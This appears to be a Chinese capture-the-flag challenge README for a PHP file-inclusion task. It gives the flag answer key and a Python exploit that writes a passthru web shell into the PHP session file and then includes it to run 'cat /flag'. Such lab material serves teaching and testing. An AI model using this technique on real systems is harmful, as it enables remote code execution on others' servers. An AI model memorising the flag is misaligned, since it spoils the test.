# 题目：文件包含

### 题目描述：文件包含

### 题目难度： 🌟🌟

### 维护：le31ei

### KEY: `flag{d41d8cd98f00b204e9800998ecf8427e}`

### 配置信息： 
1. 开放端口： `8080`

### 解题过程：

exp:
```python
#!/usr/bin/env python
# coding: utf-8

from time import sleep
import requests

url = 'http://127.0.0.1:8080'


s = requests.session()

def execute(cmd):
    params = {
        'file': '<?php passthru($_POST["cmd"]); ?>'
    }
    r = s.get(url, params=params)
    params['file'] = '/tmp/sess_' + r.cookies['PHPSESSID']

    r = s.post(url, params=params, data={'cmd': cmd})
    return r.text

print execute('cat /flag')

```

